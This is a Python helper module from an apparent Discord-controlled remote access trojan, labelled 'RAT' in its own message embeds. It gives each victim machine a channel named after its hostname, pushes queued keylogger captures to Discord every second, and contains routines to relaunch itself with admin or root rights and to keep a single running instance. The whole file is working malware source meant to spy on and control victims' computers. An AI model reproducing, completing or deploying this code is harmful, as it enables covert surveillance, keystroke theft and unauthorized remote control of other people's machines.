"""
utils.py - shared helpers used across all command modules.
"""

import asyncio
import atexit
import ctypes
import os
import platform
import re
import subprocess
import sys
import tempfile
from datetime import datetime

import discord
import psutil

from config import (
    ADMIN_STATUS_FILE,
    AUTHORIZED_USERS,
    EMBED_ICON_URL,
    IS_WINDOWS,
    bot,
)

# ── Runtime state ──────────────────────────────────────────────────────────
is_admin = False
channel_ids: dict = {}  # populated in on_ready


# ── Auth / channel checks ──────────────────────────────────────────────────
def is_authorized(ctx) -> bool:
    return ctx.author.id in AUTHORIZED_USERS


def sanitize_channel_name(name: str) -> str:
    return re.sub(r"[^a-z0-9-]", "-", name.lower())


def in_correct_channel(ctx) -> bool:
    return ctx.channel.name == sanitize_channel_name(platform.node())


def is_bot_or_command(message) -> bool:
    return message.author == bot.user or message.content.startswith(bot.command_prefix)


# ── Discord helpers ────────────────────────────────────────────────────────
async def log_message(ctx, message: str, duration: int = None):
    """Send an embed. If duration is set, delete it after that many seconds."""
    embed = discord.Embed(description=message, colour=discord.Colour.blue())
    embed.set_author(name="RAT", icon_url=EMBED_ICON_URL)
    if duration:
        msg = await ctx.send(embed=embed)
        await asyncio.sleep(duration)
        await msg.delete()
    else:
        await ctx.send(embed=embed)


async def wrong_channel(ctx, duration: int = 10):
    embed = discord.Embed(
        description="This command can only be executed in the specific channel for this PC.",
        colour=discord.Colour.red(),
    )
    embed.set_author(name="RAT", icon_url=EMBED_ICON_URL)
    msg = await ctx.send(embed=embed)
    await asyncio.sleep(duration)
    await msg.delete()


async def send_temporary_message(ctx, message: str, duration: int = 10):
    msg = await ctx.send(message)
    await asyncio.sleep(duration)
    await msg.delete()


async def generic_command_error(ctx, error):
    embed = discord.Embed(
        title="⚠️ Error", description=f"```{error}```", color=discord.Color.red()
    )
    msg = await ctx.send(embed=embed)
    await msg.delete(delay=5)


async def create_channel_if_not_exists(guild, channel_name: str):
    channel = discord.utils.get(guild.channels, name=channel_name)
    if channel is None:
        channel = await guild.create_text_channel(channel_name)
        print(f"Channel {channel_name} created with ID: {channel.id}")
    else:
        print(f"Channel {channel_name} exists with ID: {channel.id}")
    return channel


async def send_messages():
    """Background task: flush the keylogger message queue every second."""
    from commands.keylogger import messages_to_send

    await bot.wait_until_ready()
    while not bot.is_closed():
        if messages_to_send:
            for channel_id, text in messages_to_send:
                channel = bot.get_channel(channel_id)
                if channel:
                    await channel.send(text)
            messages_to_send.clear()
        await asyncio.sleep(1)


# ── String helpers ─────────────────────────────────────────────────────────
def chunk_string(text: str, chunk_size: int = 1990) -> list[str]:
    """Split a string into chunks that fit inside a Discord code block."""
    return [text[i : i + chunk_size] for i in range(0, len(text), chunk_size)]


def current_time() -> str:
    return datetime.now().strftime("%Y-%m-%d %H:%M:%S")


# ── Admin helpers ──────────────────────────────────────────────────────────
def load_admin_status():
    global is_admin
    if os.path.exists(ADMIN_STATUS_FILE):
        with open(ADMIN_STATUS_FILE, "r") as f:
            is_admin = f.read().strip().lower() == "true"


def check_if_admin() -> bool:
    try:
        if IS_WINDOWS:
            return bool(ctypes.windll.shell32.IsUserAnAdmin())
        return os.getuid() == 0
    except Exception:
        return False


def elevate():
    try:
        if check_if_admin():
            raise Exception("The process already has admin rights.")

        if IS_WINDOWS:
            script = os.path.abspath(sys.argv[0])
            ext = os.path.splitext(script)[1].lower()
            command = (
                f'"{script}"' if ext == ".exe" else f'"{sys.executable}" "{script}"'
            )
            result = ctypes.windll.shell32.ShellExecuteW(
                None, "runas", "cmd.exe", f"/k {command} & timeout /t 7 & exit", None, 1
            )
            if result > 32:
                return True
            raise Exception("Error restarting the script with admin rights.")
        else:
            subprocess.Popen(["sudo", sys.executable] + sys.argv)
            return True
    except Exception as e:
        raise Exception(f"Error requesting admin rights: {e}")


# ── Single-instance guard ──────────────────────────────────────────────────
def check_single_instance():
    pid_file = os.path.join(tempfile.gettempdir(), "script_instance.pid")

    if os.path.exists(pid_file):
        with open(pid_file, "r") as f:
            pid = int(f.read())
        if psutil.pid_exists(pid):
            print("An instance of the script is already running.")
            sys.exit(0)
        else:
            print("PID file found, but process is no longer running. Overwriting.")

    with open(pid_file, "w") as f:
        f.write(str(os.getpid()))

    def _remove():
        if os.path.exists(pid_file):
            os.remove(pid_file)

    atexit.register(_remove)
